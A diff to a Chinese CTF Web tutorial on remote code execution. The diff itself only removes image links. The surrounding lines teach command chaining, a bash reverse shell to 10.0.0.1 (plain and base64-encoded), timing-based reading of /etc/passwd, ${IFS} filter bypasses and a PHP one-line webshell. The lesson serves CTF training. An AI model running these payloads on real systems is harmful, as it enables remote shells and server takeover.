@@ -2,7 +2,6 @@
 
 在本节课中，我们将要学习CTF Web方向中一个重要的漏洞类型：远程代码执行。我们将从基础的命令联合执行开始，逐步深入到命令执行绕过、无回显利用以及PHP代码执行等核心内容。
 
-![](img/63d5e3a07ead316649f19c6cd9d414e7_1.png)
 
 ## 命令联合执行 🔗
 
@@ -20,19 +19,14 @@
     *   示例：`echo “abc” | md5sum`
 *   **换行符 `\n`**：在Shell中直接换行也相当于执行多条命令，但并非所有编程语言环境都支持。
 
-![](img/63d5e3a07ead316649f19c6cd9d414e7_3.png)
 
 除了联合执行，还有**内联执行**，我们稍后会介绍。
 
-![](img/63d5e3a07ead316649f19c6cd9d414e7_5.png)
 
-![](img/63d5e3a07ead316649f19c6cd9d414e7_7.png)
 
 ## 无回显命令执行与反弹Shell 🐚
 
-![](img/63d5e3a07ead316649f19c6cd9d414e7_9.png)
 
-![](img/63d5e3a07ead316649f19c6cd9d414e7_11.png)
 
 有时，目标虽然能执行命令，但不会将结果回显给我们，这就是无回显场景。解决无回显问题主要有两种思路：**请求带出**和**延时盲注**。
 
@@ -52,7 +46,6 @@ bash -c ‘bash -i >& /dev/tcp/10.0.0.1/12345 0>&1‘
 ```
 如果直接执行失败，可以尝试将命令写入文件后通过`curl`下载执行，或进行Base64编码后解码执行：
 
-![](img/63d5e3a07ead316649f19c6cd9d414e7_15.png)
 
 ```bash
 # Base64编码上述命令
@@ -61,7 +54,6 @@ echo ‘bash -c “bash -i >& /dev/tcp/10.0.0.1/12345 0>&1”‘ | base64
 echo ‘YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS8xMjM0NSAwPiYxIicK‘ | base64 -d | bash
 ```
 
-![](img/63d5e3a07ead316649f19c6cd9d414e7_17.png)
 
 **延时盲注**则是通过命令执行的时间差来判断条件是否成立，类似于SQL时间盲注。例如，判断`/etc/passwd`文件第一个字符是否为`r`：
 ```bash
@@ -77,7 +69,6 @@ test $(head -c 1 /etc/passwd) = “r” && sleep 5
 
 当空格被过滤时，可以用以下字符替代：
 
-![](img/63d5e3a07ead316649f19c6cd9d414e7_19.png)
 
 *   **`${IFS}`**：`IFS`是Shell的内部字段分隔符，默认为空格。
     *   示例：`cat${IFS}flag.php`
@@ -113,23 +104,18 @@ test $(head -c 1 /etc/passwd) = “r” && sleep 5
 
 ## PHP代码执行与绕过 🐘
 
-![](img/63d5e3a07ead316649f19c6cd9d414e7_23.png)
 
 代码执行漏洞允许攻击者执行后端代码（如PHP）。最常见的是`eval()`函数，它将其字符串参数当作PHP代码执行。这就是“一句话木马”的原理：`<?php eval($_POST[‘cmd’]);?>`。
 
-![](img/63d5e3a07ead316649f19c6cd9d414e7_25.png)
 
-![](img/63d5e3a07ead316649f19c6cd9d414e7_27.png)
 
 题目常对输入的代码进行限制。例如，过滤所有字母和数字。此时需要利用PHP特性构造出所需字符串。
 
-![](img/63d5e3a07ead316649f19c6cd9d414e7_29.png)
 
 ### 无字母数字WebShell构造
 
 核心思路：利用非字母数字的字符（如运算符、位运算符）通过运算生成我们需要的字符串。
 
-![](img/63d5e3a07ead316649f19c6cd9d414e7_31.png)
 
 ![](img/63d5e3a07ead316649f19c6cd9d414e7_32.png)
 
@@ -145,7 +131,6 @@ test $(head -c 1 /etc/passwd) = “r” && sleep 5
 ```
 **2. 利用PHP短标签和反引号执行命令**
 
-![](img/63d5e3a07ead316649f19c6cd9d414e7_36.png)
 
 当限制极为严格（禁用字母、数字、括号、美元符号等）且长度有限时，可以考虑这种方法。
 ```php
@@ -155,9 +140,7 @@ test $(head -c 1 /etc/passwd) = “r” && sleep 5
 *   **`` ` ``** 反引号在PHP中执行系统命令。
 *   因此，上述代码会输出执行`ls /`的结果。
 
-![](img/63d5e3a07ead316649f19c6cd9d414e7_38.png)
 
-![](img/63d5e3a07ead316649f19c6cd9d414e7_40.png)
 
 一个经典的极限绕过题目，可能只允许如下简短payload：
 ```php
@@ -167,15 +150,11 @@ test $(head -c 1 /etc/passwd) = “r” && sleep 5
 *   `<?=` 开启短标签并准备回显。
 *   **`` `cat *` ``** 执行命令，使用通配符`*`匹配`flag`文件。
 
-![](img/63d5e3a07ead316649f19c6cd9d414e7_41.png)
 
-![](img/63d5e3a07ead316649f19c6cd9d414e7_43.png)
 
 ## 总结 📚
 
-![](img/63d5e3a07ead316649f19c6cd9d414e7_45.png)
 
-![](img/63d5e3a07ead316649f19c6cd9d414e7_47.png)
 
 本节课我们一起深入学习了CTF Web中的远程代码执行漏洞。
 
